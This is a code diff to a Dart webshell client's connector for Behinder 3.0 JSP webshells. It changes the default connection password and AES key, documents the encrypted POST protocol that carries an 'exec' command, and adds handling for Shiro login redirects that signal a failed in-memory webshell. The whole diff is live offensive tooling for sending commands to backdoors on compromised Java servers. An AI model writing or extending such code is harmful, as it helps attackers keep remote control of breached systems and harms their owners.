@@ -14,9 +14,9 @@ import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
 import 'shell_connector.dart';
 
-/// `jsp_behinder.jsp` / `bing.jsp`：冰蝎 3.0 协议，AES 加密传输
+  /// `jsp_behinder.jsp` / `bing.jsp`：冰蝎 3.0 协议，AES 加密传输
 ///
-/// 密钥 = MD5(连接密码)[0:16]，默认密码 rebeyond → e45e329feb5d925b
+  /// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
 /// POST body 两行：第 1 行 base64(AES_encrypt(M.class))，第 2 行 a=exec&_k=xxx&xxx=cmd
 /// bing.jsp 兼容：payload 只读第一行，agent 用 getReader().readLine() 读第二行解析参数
 class JspBehinderConnector extends ShellConnector {
@@ -37,7 +37,7 @@ class JspBehinderConnector extends ShellConnector {
   String get _aesKey {
     final pass = webshell.password?.trim().isNotEmpty == true
         ? webshell.password!.trim()
-        : 'rebeyond';
+        : 'mAtrix_911';
     if (pass.length == 16 && _isHex16(pass)) {
       return pass.toLowerCase();
     }
@@ -176,8 +176,19 @@ class JspBehinderConnector extends ShellConnector {
 
       _updateCookies(response);
       if (response.statusCode == 200) {
-        return decodeWithFallback(response.bodyBytes);
+        final body = decodeWithFallback(response.bodyBytes);
+        // 如果响应包含典型的 Shiro 登录特征，说明内存马未生效
+        if (body.contains('rememberMe=deleteMe') || response.headers['set-cookie']?.contains('rememberMe=deleteMe') == true) {
+           return '[Error] 内存马未响应 (被 Shiro 重定向/拦截)';
+        }
+        return body;
       }
+      
+      if (response.statusCode == 302 || response.statusCode == 301) {
+        final location = response.headers['location'] ?? 'unknown';
+        return '[HTTP ${response.statusCode}] 发生重定向 -> $location\n这通常意味着内存马未生效，请求被拦截到了登录页面。';
+      }
+
       final body = decodeWithFallback(response.bodyBytes);
       final snippet = body.length > 4096
           ? '${body.substring(0, 4096)}...'
